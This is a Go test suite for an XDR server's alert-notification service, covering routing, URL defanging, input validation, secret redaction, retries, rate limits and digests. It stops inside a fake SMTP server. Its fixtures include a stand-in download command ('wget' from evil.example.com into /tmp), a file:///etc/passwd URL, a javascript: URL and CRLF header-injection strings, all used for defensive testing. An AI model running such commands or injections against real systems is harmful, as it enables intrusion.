package notify

import (
	"bufio"
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/json"
	"errors"
	"io"
	"log/slog"
	"math/big"
	"mime"
	"mime/quotedprintable"
	"net"
	"net/http"
	"net/http/httptest"
	"net/mail"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/Netdoodle/homexdr/server/internal/store"
	"github.com/Netdoodle/homexdr/shared/event"
)

// sink is a fake service that records what it receives.
type sink struct {
	*httptest.Server
	mu     sync.Mutex
	bodies []string
	heads  []http.Header
	status int
}

func newSink(t *testing.T) *sink {
	t.Helper()
	k := &sink{status: 200}
	k.Server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		k.mu.Lock()
		defer k.mu.Unlock()
		k.bodies = append(k.bodies, string(b))
		k.heads = append(k.heads, r.Header.Clone())
		w.WriteHeader(k.status)
	}))
	t.Cleanup(k.Close)
	return k
}

func (k *sink) setStatus(code int) {
	k.mu.Lock()
	k.status = code
	k.mu.Unlock()
}

func (k *sink) received() []string {
	k.mu.Lock()
	defer k.mu.Unlock()
	return append([]string(nil), k.bodies...)
}

type fixture struct {
	st  *store.Store
	svc *Service
	now time.Time
}

func newFixture(t *testing.T) *fixture {
	t.Helper()
	st, err := store.Open(filepath.Join(t.TempDir(), "state.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { st.Close() })
	f := &fixture{st: st, now: time.Now()}
	f.svc = f.service()
	return f
}

// service returns a service on the fixture's database and clock; a second call is what a
// restart looks like.
func (f *fixture) service() *Service {
	svc := New(f.st, slog.New(slog.NewTextHandler(io.Discard, nil)))
	svc.now = func() time.Time { return f.now }
	return svc
}

func (f *fixture) save(t *testing.T, channels []Channel, mut func(*Settings)) Settings {
	t.Helper()
	set := DefaultSettings()
	if mut != nil {
		mut(&set)
	}
	u := SettingsUpdate{Settings: set}
	for _, c := range channels {
		u.Channels = append(u.Channels, ChannelUpdate{Channel: c})
	}
	saved, err := f.svc.SaveSettings(context.Background(), u)
	if err != nil {
		t.Fatal(err)
	}
	return saved
}

func webhook(url string) Channel {
	return Channel{ID: "c1", Kind: KindWebhook, Name: "hook", Enabled: true, URL: url}
}

var alertSeq int

func (f *fixture) alert(t *testing.T, severity string, mut func(*store.AlertInput)) *store.Alert {
	t.Helper()
	alertSeq++
	in := store.AlertInput{
		Rule:     store.AlertRule{ID: "rule-" + strconv.Itoa(alertSeq), Title: "Wget to tmp", Level: severity},
		Severity: severity,
		Event: &event.Event{
			ID:   event.NewID(),
			Host: event.Host{ID: "h1", Name: "tower"},
			Process: &event.Process{
				EntityID: event.NewID(), Name: "wget", Executable: "/usr/bin/wget",
				CommandLine: "wget http://evil.example.com/x.sh -O /tmp/x.sh",
				Parent:      &event.Process{Name: "php", Executable: "/usr/bin/php"},
			},
		},
	}
	if mut != nil {
		mut(&in)
	}
	a, _, err := f.st.RecordAlert(context.Background(), in)
	if err != nil {
		t.Fatal(err)
	}
	return a
}

func TestRouting(t *testing.T) {
	set := DefaultSettings()
	for sev, want := range map[string]string{
		store.SevCritical: RouteNow, store.SevHigh: RouteNow, store.SevMedium: RouteDigest,
		store.SevLow: RouteLog, store.SevInformational: RouteLog, "nonsense": RouteLog,
	} {
		if got := set.Route(sev, "r1"); got != want {
			t.Errorf("default route for %s = %s, want %s", sev, got, want)
		}
	}
	set.RuleRoutes = []RuleRoute{
		{Prefix: "health:", Route: RouteNow},
		{Prefix: "net:", Route: RouteLog},
		{Prefix: "net:new-device", Route: RouteDigest},
	}
	for _, c := range []struct{ sev, rule, want string }{
		{store.SevLow, "health:feed-silent", RouteNow},
		{store.SevCritical, "net:beacon", RouteLog},
		{store.SevHigh, "net:new-device", RouteDigest},
		{store.SevHigh, "sigma-rule", RouteNow},
	} {
		if got := set.Route(c.sev, c.rule); got != c.want {
			t.Errorf("Route(%s, %s) = %s, want %s", c.sev, c.rule, got, c.want)
		}
	}
}

func TestDefang(t *testing.T) {
	for in, want := range map[string]string{
		"http://evil.example.com/a.sh":  "hxxp[://]evil[.]example[.]com/a[.]sh",
		"HTTPS://evil.example.com":      "HXXPS[://]evil[.]example[.]com",
		"connect to 203.0.113.9 now.":   "connect to 203[.]0[.]113[.]9 now.",
		"ftp://files.example.net":       "ftp[://]files[.]example[.]net",
		"a plain sentence. And another": "a plain sentence. And another",
		"/tmp/user.scripts.plg":         "/tmp/user[.]scripts[.]plg",
		"":                              "",
	} {
		if got := Defang(in); got != want {
			t.Errorf("Defang(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestUntrustedText(t *testing.T) {
	got := untrusted("first\nSeverity: critical\r\t\x07end\u202egnp.exe\u200b", 200)
	if strings.ContainsAny(got, "\n\r\x07\u202e\u200b") {
		t.Fatalf("control characters survived: %q", got)
	}
	if !strings.Contains(got, "first Severity: critical") {
		t.Fatalf("newline should become a space: %q", got)
	}
	if got := shorten("ééééé", 5); got != "éé..." {
		t.Fatalf("shorten split a character: %q", got)
	}
}

func TestSettingsValidation(t *testing.T) {
	good := func() Settings { return DefaultSettings() }
	for name, mut := range map[string]func(*Settings){
		"bad route":       func(s *Settings) { s.SeverityRoutes[store.SevHigh] = "shout" },
		"blank prefix":    func(s *Settings) { s.RuleRoutes = []RuleRoute{{Prefix: " ", Route: RouteNow}} },
		"bad prefix rule": func(s *Settings) { s.RuleRoutes = []RuleRoute{{Prefix: "x", Route: "shout"}} },
		"zero rate":       func(s *Settings) { s.RatePerHour = 0 },
		"bad time":        func(s *Settings) { s.DigestTime = "7am" },
		"bad zone":        func(s *Settings) { s.Timezone = "Mars/Olympus" },
		"bad console":     func(s *Settings) { s.ConsoleURL = "javascript:alert(1)" },
		"no url":          func(s *Settings) { s.Channels = []Channel{{Kind: KindNtfy}} },
		"file url":        func(s *Settings) { s.Channels = []Channel{{Kind: KindWebhook, URL: "file:///etc/passwd"}} },
		"http discord":    func(s *Settings) { s.Channels = []Channel{{Kind: KindDiscord, URL: "http://discord.com/x"}} },
		"unknown kind":    func(s *Settings) { s.Channels = []Channel{{Kind: "pigeon", URL: "http://x"}} },
		"no smtp host":    func(s *Settings) { s.Channels = []Channel{{Kind: KindEmail, From: "a@b.c", To: "d@e.f"}} },
		"bad from":        func(s *Settings) { s.Channels = []Channel{{Kind: KindEmail, SMTPHost: "m", From: "nope", To: "d@e.f"}} },
		"bad to": func(s *Settings) {
			s.Channels = []Channel{{Kind: KindEmail, SMTPHost: "m", From: "a@b.c", To: "x\r\nBcc: y"}}
		},
	} {
		s := good()
		mut(&s)
		var ie *InputError
		if err := s.Validate(); !errors.As(err, &ie) {
			t.Errorf("%s: want an input error, got %v", name, err)
		}
	}
	s := good()
	s.Timezone, s.ConsoleURL = "Europe/Prague", "https://xdr.example.test/"
	s.Channels = []Channel{{Kind: KindEmail, SMTPHost: "mail.example.test", From: "a@example.test", To: "b@example.test, c@example.test"}}
	if err := s.Validate(); err != nil {
		t.Fatal(err)
	}
	if s.ConsoleURL != "https://xdr.example.test" || s.Channels[0].SMTPPort != 587 || s.Channels[0].ID == "" {
		t.Fatalf("normalized: %+v", s)
	}
}

func TestSecretsAreWriteOnly(t *testing.T) {
	ctx := context.Background()
	f := newFixture(t)
	const hookURL, token, password = "https://hooks.example.test/hook-secret-path", "token-secret", "password-secret"
	f.save(t, []Channel{
		{ID: "c1", Kind: KindWebhook, Name: "hook", Enabled: true, URL: hookURL, Token: token},
		{ID: "c2", Kind: KindEmail, Name: "mail", Enabled: true, SMTPHost: "mail.example.test", SMTPUser: "me", Password: password, From: "a@example.test", To: "b@example.test"},
	}, nil)
	b, err := json.Marshal(f.svc.Settings(ctx).View())
	if err != nil {
		t.Fatal(err)
	}
	for _, secret := range []string{"hook-secret-path", token, password} {
		if strings.Contains(string(b), secret) {
			t.Fatalf("the view holds a secret: %s", b)
		}
	}
	view := string(b)
	for _, want := range []string{`"url_set":true`, `"token_set":true`, `"password_set":true`, `"url_host":"hooks.example.test"`} {
		if !strings.Contains(view, want) {
			t.Errorf("view is missing %s: %s", want, view)
		}
	}

	// Saving with blank secrets keeps them; clearing removes them.
	var u SettingsUpdate
	if err := json.Unmarshal([]byte(`{"rate_per_hour":10,"digest_time":"07:00","channels":[
		{"id":"c1","kind":"webhook","name":"renamed","enabled":true,"clear_token":true},
		{"id":"c2","kind":"email","name":"mail","enabled":false,"smtp_host":"mail.example.test","from":"a@example.test","to":"b@example.test"}]}`), &u); err != nil {
		t.Fatal(err)
	}
	if _, err := f.svc.SaveSettings(ctx, u); err != nil {
		t.Fatal(err)
	}
	set := f.svc.Settings(ctx)
	c1, _ := set.channel("c1")
	c2, _ := set.channel("c2")
	if c1.URL != hookURL || c1.Token != "" || c1.Name != "renamed" {
		t.Fatalf("c1: %+v", c1)
	}
	if c2.Password != password || c2.Enabled {
		t.Fatalf("c2: %+v", c2)
	}
	// A channel left out is gone, with its secrets.
	u.Channels = u.Channels[:1]
	if _, err := f.svc.SaveSettings(ctx, u); err != nil {
		t.Fatal(err)
	}
	if _, ok := f.svc.Settings(ctx).channel("c2"); ok {
		t.Fatal("a removed channel stayed")
	}
}

func TestUpdateWithoutRoutesKeepsSafeDefaults(t *testing.T) {
	set := SettingsUpdate{Settings: Settings{RatePerHour: 5, DigestTime: "08:00"}}.Apply(DefaultSettings())
	if got := set.Route(store.SevCritical, "r1"); got != RouteNow {
		t.Fatalf("critical with no routes in the update = %s", got)
	}
	if got := set.Route(store.SevLow, "r1"); got != RouteLog {
		t.Fatalf("low with no routes in the update = %s", got)
	}
}

func TestOffUntilAChannelIsAdded(t *testing.T) {
	ctx := context.Background()
	f := newFixture(t)
	f.svc.AlertCreated(ctx, f.alert(t, store.SevCritical, nil))
	if err := f.svc.digestIfDue(ctx); err != nil {
		t.Fatal(err)
	}
	due, err := f.st.DueNotifications(ctx, f.now.Add(time.Hour), 10)
	if err != nil || len(due) != 0 {
		t.Fatalf("something was queued with no channel: %v %v", due, err)
	}
	// A disabled channel is no channel.
	k := newSink(t)
	c := webhook(k.URL)
	c.Enabled = false
	f.save(t, []Channel{c}, nil)
	f.svc.AlertCreated(ctx, f.alert(t, store.SevCritical, nil))
	if due, _ := f.st.DueNotifications(ctx, f.now.Add(time.Hour), 10); len(due) != 0 {
		t.Fatalf("queued for a disabled channel: %v", due)
	}
}

func TestAlertRoutesAndNoNetworkOnIngest(t *testing.T) {
	ctx := context.Background()
	f := newFixture(t)
	k := newSink(t)
	f.save(t, []Channel{webhook(k.URL)}, func(s *Settings) {
		s.RuleRoutes = []RuleRoute{{Prefix: "health:", Route: RouteNow}}
		s.ConsoleURL = "https://xdr.example.test"
	})
	high := f.alert(t, store.SevHigh, nil)
	f.svc.AlertCreated(ctx, high)
	f.svc.AlertCreated(ctx, f.alert(t, store.SevMedium, nil))
	f.svc.AlertCreated(ctx, f.alert(t, store.SevLow, nil))
	f.svc.AlertCreated(ctx, f.alert(t, store.SevLow, func(in *store.AlertInput) { in.Rule.ID = "health:feed-silent" }))
	if got := k.received(); len(got) != 0 {
		t.Fatalf("AlertCreated used the network: %v", got)
	}
	f.svc.deliverDue(ctx)
	got := k.received()
	if len(got) != 2 {
		t.Fatalf("delivered %d, want the high alert and the routed low one", len(got))
	}
	var m Message
	if err := json.Unmarshal([]byte(got[0]), &m); err != nil {
		t.Fatal(err)
	}
	if m.AlertID != high.ID || m.Severity != store.SevHigh || m.Link != "https://xdr.example.test/alerts/"+high.ID {
		t.Fatalf("message: %+v", m)
	}
	if !strings.Contains(m.Title, "[HIGH]") || !strings.Contains(m.Title, "tower") {
		t.Fatalf("title: %q", m.Title)
	}
	if strings.Contains(m.Body, "http://") || strings.Contains(m.Body, "evil.example.com") || !strings.Contains(m.Body, "hxxp[://]evil[.]example[.]com") {
		t.Fatalf("the command line was not defanged: %q", m.Body)
	}
	// Nothing left to do.
	f.svc.deliverDue(ctx)
	if got := k.received(); len(got) != 2 {
		t.Fatalf("sent again: %d", len(got))
	}
}

func TestAttackerTextCannotForgeMessageLines(t *testing.T) {
	a := &store.Alert{ID: "a1", Severity: store.SevHigh, Hostname: "tower\nSeverity: informational", Rule: store.AlertRule{Title: "x\r\ny"},
		Event: &event.Event{Process: &event.Process{Name: "sh", CommandLine: "sh -c 'a'\nRule: harmless\nOpen https://evil.example.com"}}}
	m := alertMessage(DefaultSettings(), a)
	if strings.Contains(m.Title, "\n") || strings.Contains(m.Title, "\r") {
		t.Fatalf("title has a line break: %q", m.Title)
	}
	for _, line := range strings.Split(m.Body, "\n") {
		if strings.HasPrefix(line, "Rule: harmless") || strings.HasPrefix(line, "Open ") {
			t.Fatalf("a value forged a line: %q", m.Body)
		}
	}
	if strings.Contains(m.Body, "https://") {
		t.Fatalf("a live link survived: %q", m.Body)
	}
}

func TestServiceFormats(t *testing.T) {
	ctx := context.Background()
	f := newFixture(t)
	k := newSink(t)
	m := Message{Title: "[HIGH] Über *rule* on @everyone", Body: "see [click](hxxp[://]evil) and @everyone", Severity: store.SevCritical, Link: "https://xdr.example.test/alerts/a1"}

	if err := f.svc.send(ctx, Channel{Kind: KindNtfy, URL: k.URL, Token: "tok"}, m); err != nil {
		t.Fatal(err)
	}
	h := k.heads[0]
	if h.Get("Priority") != "5" || h.Get("Click") != m.Link || h.Get("Authorization") != "Bearer tok" {
		t.Fatalf("ntfy headers: %v", h)
	}
	if strings.ContainsFunc(h.Get("Title"), func(r rune) bool { return r > 127 }) {
		t.Fatalf("a non-ASCII header: %q", h.Get("Title"))
	}
	if !strings.Contains(k.bodies[0], m.Link) {
		t.Fatalf("ntfy body: %q", k.bodies[0])
	}

	if err := f.svc.send(ctx, Channel{Kind: KindDiscord, URL: k.URL}, m); err != nil {
		t.Fatal(err)
	}
	var d struct {
		Content string `json:"content"`
		Allowed struct {
			Parse []string `json:"parse"`
		} `json:"allowed_mentions"`
	}
	if err := json.Unmarshal([]byte(k.bodies[1]), &d); err != nil {
		t.Fatal(err)
	}
	if d.Allowed.Parse == nil || len(d.Allowed.Parse) != 0 {
		t.Fatalf("mentions are not off: %s", k.bodies[1])
	}
	if strings.Contains(d.Content, "[click](") || strings.Contains(d.Content, " @everyone") || !strings.Contains(d.Content, "<"+m.Link+">") {
		t.Fatalf("discord content: %q", d.Content)
	}

	// Long text is cut to what Discord takes, and the link survives it.
	long := m
	long.Body = strings.Repeat("*_", 3000)
	if err := f.svc.send(ctx, Channel{Kind: KindDiscord, URL: k.URL}, long); err != nil {
		t.Fatal(err)
	}
	if err := json.Unmarshal([]byte(k.bodies[2]), &d); err != nil {
		t.Fatal(err)
	}
	if n := len([]rune(d.Content)); n > 2000 || !strings.Contains(d.Content, m.Link) {
		t.Fatalf("discord long message: %d runes, link kept: %v", n, strings.Contains(d.Content, m.Link))
	}
}

func TestRedirectIsNotFollowed(t *testing.T) {
	ctx := context.Background()
	f := newFixture(t)
	k := newSink(t)
	redirect := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, k.URL, http.StatusTemporaryRedirect)
	}))
	defer redirect.Close()
	if err := f.svc.send(ctx, webhook(redirect.URL), Message{Title: "t"}); err == nil {
		t.Fatal("a redirect counted as delivered")
	}
	if got := k.received(); len(got) != 0 {
		t.Fatalf("followed a redirect: %v", got)
	}
}

func TestRetryBackoffAndRestart(t *testing.T) {
	ctx := context.Background()
	f := newFixture(t)
	k := newSink(t)
	k.setStatus(503)
	f.save(t, []Channel{webhook(k.URL + "/hook-secret-path")}, nil)
	f.svc.AlertCreated(ctx, f.alert(t, store.SevHigh, nil))

	f.svc.deliverDue(ctx)
	if got := len(k.received()); got != 1 {
		t.Fatalf("first try: %d requests", got)
	}
	st, err := f.svc.Status(ctx)
	if err != nil {
		t.Fatal(err)
	}
	if st.Pending != 1 || len(st.Failures) != 1 || !strings.Contains(st.Failures[0].LastError, "503") {
		t.Fatalf("status after a failure: %+v", st)
	}
	// Not due yet: no second try until the backoff has passed.
	f.svc.deliverDue(ctx)
	if got := len(k.received()); got != 1 {
		t.Fatalf("retried before the backoff: %d", got)
	}

	// It survives a restart and goes out once the service is back.
	f.svc = f.service()
	f.now = f.now.Add(firstBackoff + time.Second)
	k.setStatus(200)
	f.svc.deliverDue(ctx)
	if got := len(k.received()); got != 2 {
		t.Fatalf("after the restart: %d requests", got)
	}
	st, _ = f.svc.Status(ctx)
	if st.Pending != 0 || st.Sent24h != 1 || st.LastSentAt == nil || len(st.Failures) != 0 {
		t.Fatalf("status after success: %+v", st)
	}
}

func TestBackoffGrowsAndGivesUp(t *testing.T) {
	if backoff(1) != firstBackoff || backoff(2) != 2*firstBackoff || backoff(3) != 4*firstBackoff || backoff(40) != maxBackoff {
		t.Fatalf("backoff: %v %v %v %v", backoff(1), backoff(2), backoff(3), backoff(40))
	}
	ctx := context.Background()
	f := newFixture(t)
	k := newSink(t)
	k.setStatus(500)
	f.save(t, []Channel{webhook(k.URL)}, nil)
	f.svc.AlertCreated(ctx, f.alert(t, store.SevHigh, nil))
	for range maxAttempts + 3 {
		f.svc.deliverDue(ctx)
		f.now = f.now.Add(maxBackoff + time.Second)
	}
	if got := len(k.received()); got != maxAttempts {
		t.Fatalf("tried %d times, want %d", got, maxAttempts)
	}
	st, _ := f.svc.Status(ctx)
	if st.Pending != 0 || st.Failed24h != 1 || len(st.Failures) != 1 {
		t.Fatalf("status after giving up: %+v", st)
	}
}

func TestErrorsHideSecrets(t *testing.T) {
	ctx := context.Background()
	f := newFixture(t)
	// Nothing listens here, so the client's error quotes the URL it could not reach.
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	addr := l.Addr().String()
	l.Close()
	c := Channel{Kind: KindWebhook, URL: "http://" + addr + "/hook-secret-path?key=query-secret", Token: "tok-secret"}
	err = f.svc.send(ctx, c, Message{Title: "t"})
	if err == nil {
		t.Fatal("expected a failure")
	}
	for _, secret := range []string{"hook-secret-path", "query-secret", "tok-secret"} {
		if strings.Contains(err.Error(), secret) {
			t.Fatalf("the error shows a secret: %v", err)
		}
	}
}

func TestRateCap(t *testing.T) {
	ctx := context.Background()
	f := newFixture(t)
	k1, k2 := newSink(t), newSink(t)
	c2 := webhook(k2.URL)
	c2.ID = "c2"
	f.save(t, []Channel{webhook(k1.URL), c2}, func(s *Settings) { s.RatePerHour = 2 })
	for range 5 {
		f.svc.AlertCreated(ctx, f.alert(t, store.SevHigh, nil))
	}
	f.svc.deliverDue(ctx)
	// Two alerts and one notice about the flood, on each channel. Two channels do not
	// use up the cap twice as fast.
	for _, k := range []*sink{k1, k2} {
		got := k.received()
		if len(got) != 3 {
			t.Fatalf("channel got %d messages: %v", len(got), got)
		}
		if !strings.Contains(got[2], "hourly limit") {
			t.Fatalf("no notice: %q", got[2])
		}
	}
	st, _ := f.svc.Status(ctx)
	if st.Overflow1h != 3 {
		t.Fatalf("overflow: %+v", st)
	}
	// The digest tells about the rest.
	m, news, err := f.svc.buildDigest(ctx, f.svc.Settings(ctx), f.now.Add(-time.Hour))
	if err != nil {
		t.Fatal(err)
	}
	if !news || !strings.Contains(m.Body, "3 more") {
		t.Fatalf("digest: %q", m.Body)
	}
	// An hour on, there is room again.
	f.now = f.now.Add(time.Hour + time.Minute)
	f.svc.AlertCreated(ctx, f.alert(t, store.SevHigh, nil))
	f.svc.deliverDue(ctx)
	if got := len(k1.received()); got != 4 {
		t.Fatalf("after the hour: %d", got)
	}
}

func TestSuppressedAlertsNeverNotify(t *testing.T) {
	ctx := context.Background()
	f := newFixture(t)
	k := newSink(t)
	f.save(t, []Channel{webhook(k.URL)}, nil)

	sup := f.alert(t, store.SevHigh, func(in *store.AlertInput) {
		in.Suppression = &store.AlertSuppression{ID: "s1", Reason: "job"}
	})
	if sup.Status != store.AlertSuppressed {
		t.Fatalf("status: %s", sup.Status)
	}
	f.svc.AlertCreated(ctx, sup)

	// Suppressed while waiting in the outbox: dropped, not sent.
	waiting := f.alert(t, store.SevHigh, nil)
	f.svc.AlertCreated(ctx, waiting)
	if _, err := f.st.CloseAlertsAsSuppressed(ctx, []string{waiting.ID}, store.AlertSuppression{ID: "s1", Reason: "job"}, "alice", "closed"); err != nil {
		t.Fatal(err)
	}
	f.svc.deliverDue(ctx)
	if got := k.received(); len(got) != 0 {
		t.Fatalf("a suppressed alert was sent: %v", got)
	}
	// A hit that a suppression matched but could not close is a real alert.
	kept := f.alert(t, store.SevCritical, func(in *store.AlertInput) {
		in.Suppression = &store.AlertSuppression{ID: "s1", Reason: "job", Overridden: true, Why: "critical alerts are never suppressed"}
	})
	f.svc.AlertCreated(ctx, kept)
	f.svc.deliverDue(ctx)
	got := k.received()
	if len(got) != 1 || !strings.Contains(got[0], "never suppressed") {
		t.Fatalf("a kept alert: %v", got)
	}
}

func TestChannelRemovedWhileWaiting(t *testing.T) {
	ctx := context.Background()
	f := newFixture(t)
	k := newSink(t)
	f.save(t, []Channel{webhook(k.URL)}, nil)
	f.svc.AlertCreated(ctx, f.alert(t, store.SevHigh, nil))
	f.save(t, nil, nil)
	f.svc.deliverDue(ctx)
	if got := k.received(); len(got) != 0 {
		t.Fatalf("sent to a removed channel: %v", got)
	}
	if st, _ := f.svc.Status(ctx); st.Pending != 0 {
		t.Fatalf("still pending: %+v", st)
	}
}

func TestDigestSchedule(t *testing.T) {
	ctx := context.Background()
	f := newFixture(t)
	k := newSink(t)
	// 06:30 in Prague, with the digest at 07:00.
	prague, err := time.LoadLocation("Europe/Prague")
	if err != nil {
		t.Fatal(err)
	}
	f.now = time.Date(2026, 11, 5, 6, 30, 0, 0, prague)
	f.save(t, []Channel{webhook(k.URL)}, func(s *Settings) { s.Timezone, s.DigestTime, s.Heartbeat = "Europe/Prague", "07:00", true })

	// First run only starts the clock.
	if err := f.svc.digestIfDue(ctx); err != nil {
		t.Fatal(err)
	}
	f.alert(t, store.SevMedium, nil)
	step := func(at time.Time) int {
		t.Helper()
		f.now = at
		if err := f.svc.digestIfDue(ctx); err != nil {
			t.Fatal(err)
		}
		f.svc.deliverDue(ctx)
		return len(k.received())
	}
	if n := step(time.Date(2026, 11, 5, 6, 59, 0, 0, prague)); n != 0 {
		t.Fatalf("sent before its time: %d", n)
	}
	if n := step(time.Date(2026, 11, 5, 7, 0, 30, 0, prague)); n != 1 {
		t.Fatalf("at its time: %d", n)
	}
	if n := step(time.Date(2026, 11, 5, 7, 1, 0, 0, prague)); n != 1 {
		t.Fatalf("sent twice: %d", n)
	}
	// A restart does not repeat it.
	f.svc = f.service()
	if n := step(time.Date(2026, 11, 5, 18, 0, 0, 0, prague)); n != 1 {
		t.Fatalf("sent again after a restart: %d", n)
	}
	// A digest missed while the server was down goes out when it is back.
	f.alert(t, store.SevMedium, nil)
	if n := step(time.Date(2026, 11, 6, 9, 15, 0, 0, prague)); n != 2 {
		t.Fatalf("missed digest: %d", n)
	}
	st, err := f.svc.Status(ctx)
	if err != nil {
		t.Fatal(err)
	}
	if st.NextDigestAt == nil || st.NextDigestAt.Hour() != 7 || st.NextDigestAt.Day() != 7 || st.LastDigestAt == nil {
		t.Fatalf("digest times: %+v", st)
	}
}

func TestDigestContent(t *testing.T) {
	ctx := context.Background()
	f := newFixture(t)
	k := newSink(t)
	set := f.save(t, []Channel{webhook(k.URL)}, func(s *Settings) { s.ConsoleURL = "https://xdr.example.test" })
	since := f.now.Add(-time.Hour)

	// Truly nothing: no news, and no digest unless a heartbeat is on.
	if _, news, err := f.svc.buildDigest(ctx, set, since); err != nil || news {
		t.Fatalf("empty digest: news=%v err=%v", news, err)
	}
	if err := f.svc.queueDigest(ctx, set, set.Channels, since); err != nil {
		t.Fatal(err)
	}
	if due, _ := f.st.DueNotifications(ctx, f.now, 10); len(due) != 0 {
		t.Fatalf("an empty digest was queued: %+v", due)
	}
	heart := set
	heart.Heartbeat = true
	if err := f.svc.queueDigest(ctx, heart, set.Channels, since); err != nil {
		t.Fatal(err)
	}
	f.svc.deliverDue(ctx)
	if got := k.received(); len(got) != 1 || !strings.Contains(got[0], "nothing to report") {
		t.Fatalf("heartbeat: %v", got)
	}

	// Now with something to say.
	med := f.alert(t, store.SevMedium, func(in *store.AlertInput) { in.Rule.ID, in.Rule.Title = "r-med", "Reach http://evil.example.com" })
	for range 3 {
		f.alert(t, store.SevMedium, func(in *store.AlertInput) { in.Rule.ID, in.Rule.Title = "r-med", "Reach http://evil.example.com" })
	}
	f.alert(t, store.SevHigh, func(in *store.AlertInput) { in.Rule.ID, in.Rule.Title = "r-high", "Bad thing" })
	f.alert(t, store.SevLow, func(in *store.AlertInput) { in.Rule.ID, in.Rule.Title = "r-low", "Quiet thing" })
	sup := f.alert(t, store.SevMedium, func(in *store.AlertInput) {
		in.Rule.ID, in.Rule.Title = "r-sup", "Hidden thing"
		in.Suppression = &store.AlertSuppression{ID: "s1", Reason: "job"}
	})
	_ = sup
	if _, err := f.st.QueueTriage(ctx, med.ID, "auto", "", store.EngineAPI); err != nil {
		t.Fatal(err)
	}
	if err := f.st.FinishTriage(ctx, &store.Triage{AlertID: med.ID, Status: store.TriageDone, Verdict: "suspicious", Report: json.RawMessage(`{}`)}); err != nil {
		t.Fatal(err)
	}
	f.svc.AddDigestSection("Feed health", func(context.Context, time.Time) ([]string, error) {
		return []string{"Feed unbound.example.net went silent"}, nil
	})
	f.svc.AddDigestSection("Empty", func(context.Context, time.Time) ([]string, error) { return nil, nil })
	f.svc.AddDigestSection("Broken", func(context.Context, time.Time) ([]string, error) { return []string{"x"}, errors.New("boom") })

	m, news, err := f.svc.buildDigest(ctx, set, since)
	if err != nil {
		t.Fatal(err)
	}
	if !news {
		t.Fatal("no news?")
	}
	for _, want := range []string{
		"1 high", "1 medium", "1 low", "4 x Reach",
		"Bad thing", "hxxp[://]evil[.]example[.]com",
		"Top repeating",
		"Suppressed", "1 hit closed by suppressions",
		"AI analyst", "1 suspicious", "https://xdr.example.test/alerts/" + med.ID,
		"Feed health", "unbound[.]example[.]net",
	} {
		if !strings.Contains(m.Body, want) {
			t.Errorf("digest is missing %q:\n%s", want, m.Body)
		}
	}
	for _, not := range []string{"Quiet thing", "Hidden thing", "Empty", "Broken", "http://evil"} {
		if strings.Contains(m.Body, not) {
			t.Errorf("digest should not say %q:\n%s", not, m.Body)
		}
	}
	if !strings.Contains(m.Title, "3 alerts") || !strings.Contains(m.Title, "1 suppressed") {
		t.Errorf("title: %q", m.Title)
	}

	// A section alone is news.
	g := newFixture(t)
	g.svc.AddDigestSection("Feed health", func(context.Context, time.Time) ([]string, error) { return []string{"a feed is silent"}, nil })
	if _, news, err := g.svc.buildDigest(ctx, DefaultSettings(), since); err != nil || !news {
		t.Fatalf("section only: news=%v err=%v", news, err)
	}
}

func TestChannelTest(t *testing.T) {
	ctx := context.Background()
	f := newFixture(t)
	k := newSink(t)
	f.save(t, []Channel{webhook(k.URL)}, nil)
	if err := f.svc.Test(ctx, "c1"); err != nil {
		t.Fatal(err)
	}
	if got := k.received(); len(got) != 1 || !strings.Contains(got[0], "test message") {
		t.Fatalf("test message: %v", got)
	}
	k.setStatus(404)
	if err := f.svc.Test(ctx, "c1"); err == nil || !strings.Contains(err.Error(), "404") {
		t.Fatalf("failed test: %v", err)
	}
	if err := f.svc.Test(ctx, "nope"); !errors.Is(err, ErrNoChannel) {
		t.Fatalf("unknown channel: %v", err)
	}
	// A test is not an alert: it uses none of the cap and leaves no outbox row.
	if st, _ := f.svc.Status(ctx); st.Sent24h != 0 || st.Pending != 0 {
		t.Fatalf("status: %+v", st)
	}
}

// fakeSMTP is just enough of a mail server: STARTTLS when it has a certificate, PLAIN auth,
// one message.
type fakeSMTP struct {
	l        net.Listener
	cert     *tls.Certificate
	mu       sync.Mutex
	authedIn string // "tls" or "clear"
	mailFrom string
	rcpt     []string
	data     string
}

func newTestCert(t *testing.T) (tls.Certificate, *x509.CertPool) {
	t.Helper()
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	tpl := &x509.Certificate{SerialNumber: big.NewInt(1), Subject: pkix.Name{CommonName: "localhost"}, DNSNames: []string{"localhost"},
		NotBefore: time.Now().Add(-time.Hour), NotAfter: time.Now().Add(time.Hour), IsCA: true, BasicConstraintsValid: true,
		KeyUsage: x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign, ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth}}
	der, err := x509.CreateCertificate(rand.Reader, tpl, tpl, &key.PublicKey, key)
	if err != nil {
		t.Fatal(err)
	}
	leaf, err := x509.ParseCertificate(der)
	if err != nil {
		t.Fatal(err)
	}
	pool := x509.NewCertPool()
	pool.AddCert(leaf)
	return tls.Certificate{Certificate: [][]byte{der}, PrivateKey: key}, pool
}

func startSMTP(t *testing.T, cert *tls.Certificate) *fakeSMTP {
	t.Helper()
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { l.Close() })
	s := &fakeSMTP{l: l, cert: cert}
	go func() {
		for {
			conn, err := l.Accept()
			if err != nil {
				return
			}
			go s.serve(conn)
		}
	}()
	return s
}

func (s *fakeSMTP) port() int { return s.l.Addr().(*net.TCPAddr).Port }

func (s *fakeSMTP) serve(conn net.Conn) {
	defer func() { conn.Close() }()
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	r := bufio.NewReader(conn)
	write := func(line string) { io.WriteString(conn, line+"\r\n") }
	write("220 fake ESMTP")
	secure := false
	for {
		line, err := r.ReadString('\n')
		if err != nil {
			return
		}
